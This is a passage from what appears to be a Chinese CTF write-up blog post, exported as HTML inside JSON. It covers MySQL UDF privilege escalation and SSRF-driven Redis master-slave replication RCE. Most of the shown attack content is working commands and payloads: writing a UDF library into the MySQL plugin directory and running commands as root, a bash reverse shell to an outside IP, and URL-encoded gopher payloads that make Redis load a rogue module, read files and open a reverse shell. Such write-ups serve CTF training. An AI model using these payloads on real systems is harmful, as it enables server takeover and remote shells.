6666 -D mysql -e <span class=\"string\">&quot;create table foo(line blob);&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;insert into foo values(load_file(&#x27;/tmp/lib_mysqludf_sys_64.so&#x27;));&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select * from mysql.func;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select sys_eval(&#x27;whoami&#x27;);&quot;</span> <span class=\"comment\">#返回 root</span></span><br></pre></td></tr></table></figure>\n\n<p>创建函数成功，进行反弹rootshell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select sys_eval(&#x27;bash -c \\\\&#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/9999 0&gt;&amp;1\\\\&#x27;&#x27;);&quot;</span>  </span><br><span class=\"line\"><span class=\"comment\">#  \\\\&#x27; 对单引号进行转义</span></span><br></pre></td></tr></table></figure>\n\n<p>接受shell，<strong>cat &#x2F;flag</strong></p>\n<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><h2 id=\"SSRF之Redis主从复制实现RCE\"><a href=\"#SSRF之Redis主从复制实现RCE\" class=\"headerlink\" title=\"SSRF之Redis主从复制实现RCE\"></a>SSRF之Redis主从复制实现RCE</h2><h3 id=\"SSRFMe-2020网鼎杯\"><a href=\"#SSRFMe-2020网鼎杯\" class=\"headerlink\" title=\"SSRFMe 2020网鼎杯\"></a>SSRFMe 2020网鼎杯</h3><h3 id=\"redis常用命令\"><a href=\"#redis常用命令\" class=\"headerlink\" title=\"redis常用命令\"></a>redis常用命令</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker</span><br><span class=\"line\">get xz                              # 获取键xz的内容</span><br><span class=\"line\">SET score 857                       # 设置键score的值为857</span><br><span class=\"line\">INCR score                          # 使用INCR命令将score的值增加1</span><br><span class=\"line\">GET score                           # 获取键score的内容</span><br><span class=\"line\">keys *                              # 列出当前数据库中所有的键</span><br><span class=\"line\">config set protected-mode no        # 关闭安全模式</span><br><span class=\"line\">get anotherkey                      # 获取一个不存在的键的值</span><br><span class=\"line\">config set dir /root/redis          # 设置保存目录</span><br><span class=\"line\">config set dbfilename redis.rdb     # 设置保存文件名</span><br><span class=\"line\">config get dir                      # 查看保存目录</span><br><span class=\"line\">config get dbfilename               # 查看保存文件名</span><br><span class=\"line\">save                                # 进行一次备份操作</span><br><span class=\"line\">flushall                            # 删除所有数据</span><br><span class=\"line\">del key                             # 删除键为key的数据</span><br><span class=\"line\">slaveof ip port                     # 设置主从关系</span><br><span class=\"line\">redis-cli -h ip -p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure>\n\n<p>主从复制是指将一台Redis主服务器的数据，复制到其他的Redis从服务器。前者称为主节点(master)，后者称为从节点(slave)；</p>\n<p>所有的<strong>数据修改</strong>只<strong>在主服务器</strong>上进行，然后将最新的<strong>数据同步</strong>给<strong>从服务器</strong>，这样就使得<strong>主从服务器的数据是一致</strong>的</p>\n<h3 id=\"建立主从复制，有3种方式：\"><a href=\"#建立主从复制，有3种方式：\" class=\"headerlink\" title=\"建立主从复制，有3种方式：\"></a>建立主从复制，有3种方式：</h3><ol>\n<li><p>配置文件写入 <code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n<li><p>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n<li><p>连接到客户端之后执行 <code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n</ol>\n<p>  PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</p>\n<h3 id=\"使用exp进行rce\"><a href=\"#使用exp进行rce\" class=\"headerlink\" title=\"使用exp进行rce\"></a>使用exp进行rce</h3><p>预先通过内网穿透将端口（8009）映射到公网上</p>\n<p>使用 <strong>Redis 远程代码执行脚本</strong>开启服务</p>\n<p>使用说明</p>\n<p><a href=\"https://blog.csdn.net/gitblog_09313/article/details/142229727\">https://blog.csdn.net/gitblog_09313/article/details/142229727</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 redis_rogue_server.py -v -path exp.so -lport 8009</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"进入到目标目录\"><a href=\"#进入到目标目录\" class=\"headerlink\" title=\"进入到目标目录\"></a>进入到目标目录</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dir /tmp/ #tmp目录有相应权限</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"从本地添加文件\"><a href=\"#从本地添加文件\" class=\"headerlink\" title=\"从本地添加文件\"></a>从本地添加文件</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%2520%2520%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dbfilename exp.so</span><br><span class=\"line\">slaveof 121.43.126.238 8009  #公网ip， 开启主服务</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"加载exp\"><a href=\"#加载exp\" class=\"headerlink\" title=\"加载exp\"></a>加载exp</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520.%252Fexp.so%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">module load ./exp.so</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"rce\"><a href=\"#rce\" class=\"headerlink\" title=\"rce\"></a>rce</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">system.exec &quot;cat /flag&quot;</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"以上三个命令可以合并\"><a href=\"#以上三个命令可以合并\" class=\"headerlink\" title=\"以上三个命令可以合并\"></a>以上三个命令可以合并</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%250Amodule%2520load%2520.%252Fexp.so%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dir /tmp/</span><br><span class=\"line\">config set dbfilename exp.so</span><br><span class=\"line\">slaveof 121.43.126.238 8009</span><br><span class=\"line\">module load ./exp.so</span><br><span class=\"line\">system.exec &quot;cat /flag&quot;</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"也可以进行反弹shell\"><a href=\"#也可以进行反弹shell\" class=\"headerlink\" title=\"也可以进行反弹shell\"></a>也可以进行反弹shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Asystem.rev%2520121.43.126.238%2520%25208888%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">#上述payload的解码结果</span><br><span class=\"line\">_auth root</span><br><span class=\"line\">system.rev 121.43.126.238  8888</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n","feature":true,"text":"原型链污染python原型链污染Jinja Mark python原型链污染例子 123456789101112131415161718192021222324...","permalink":"/post/赛题总结2","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">python原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Jinja-Mark\"><span class=\"toc-text\">Jinja Mark</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95\"><span class=\"toc-text\">绕过黑名单</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSTI%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SSTI注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">特殊变量与原型链污染的关系</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9C%A3%E9%92%A5%E4%B9%8B%E6%88%981-0\"><span class=\"toc-text\">圣钥之战1.0</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABphar\"><span class=\"toc-text\">文件包含phar</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#NISACTF-2022-bingdundun\"><span class=\"toc-text\">NISACTF 2022 bingdundun~</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#babyupload\"><span class=\"toc-text\">babyupload</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CVE-2020-35736\"><span class=\"toc-text\">CVE-2020-35736</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8-os-path-join-%E5%A4%84%E7%90%86%E8%B7%AF%E5%BE%84%E7%9A%84%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">利用 os.path.join 处理路径的拼接问题</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#babyserialize\"><span class=\"toc-text\">babyserialize</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#pop-4%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">pop 4对象</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9B%B4%E6%8E%A5fenjing%E4%B8%80%E6%8A%8A%E6%A2%AD\"><span class=\"toc-text\">直接fenjing一把梭</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2024%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B-brother\"><span class=\"toc-text\">2024年春秋杯网络安全联赛夏季赛 brother</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#UDF%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">UDF提权</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SSRF\"><span class=\"toc-text\">SSRF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF%E4%B9%8BRedis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%AE%9E%E7%8E%B0RCE\"><span class=\"toc-text\">SSRF之Redis主从复制实现RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSRFMe-2020%E7%BD%91%E9%BC%8E%E6%9D%AF\"><span class=\"toc-text\">SSRFMe 2020网鼎杯</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">redis常用命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BB%BA%E7%AB%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%8C%E6%9C%893%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A\"><span class=\"toc-text\">建立主从复制，有3种方式：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8exp%E8%BF%9B%E8%A1%8Crce\"><span class=\"toc-text\">使用exp进行rce</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E5%85%A5%E5%88%B0%E7%9B%AE%E6%A0%87%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">进入到目标目录</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%8E%E6%9C%AC%E5%9C%B0%E6%B7%BB%E5%8A%A0%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">从本地添加文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E8%BD%BDexp\"><span class=\"toc-text\">加载exp</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#rce\"><span class=\"toc-text\">rce</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A5%E4%B8%8A%E4%B8%89%E4%B8%AA%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E5%90%88%E5%B9%B6\"><span class=\"toc-text\">以上三个命令可以合并</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">也可以进行反弹shell</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"赛题总结1","uid":"befe7ebe5c3909555effd7c815dc781c","slug":"赛题总结1","date":"2024-10-31T08:36:49.000Z","updated":"2024-10-31T08:37:27.571Z","comments":true,"path":"api/articles/赛题总结1.json","keywords":null,"cover":"/image/9.jpg","text":"https://gz.imxbt.cn/games Ctf经验及其题目总结l 做题经验：不要忽略index.php** 和查看源代码 l robots.txt ...","permalink":"/post/赛题总结1","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"sudo","uid":"411ff314093c5c27d7d9daaaa1c43d8a","slug":"sudo","date":"2024-10-30T11:01:49.000Z","updated":"2024-10-30T11:06:54.705Z","comments":true,"path":"api/articles/sudo.json","keywords":null,"cover":"/image/10.png","text":"SUDOGTFOBins 1sudo -l CVE-2019-14287aptapache2ashawkbase64bashcpcpulimitcurldate...","permalink":"/post/sudo","photos":[],"count_time":{"symbolsCount":397,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"sudo提权","slug":"sudo提权","count":1,"path":"api/tags/sudo提权.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}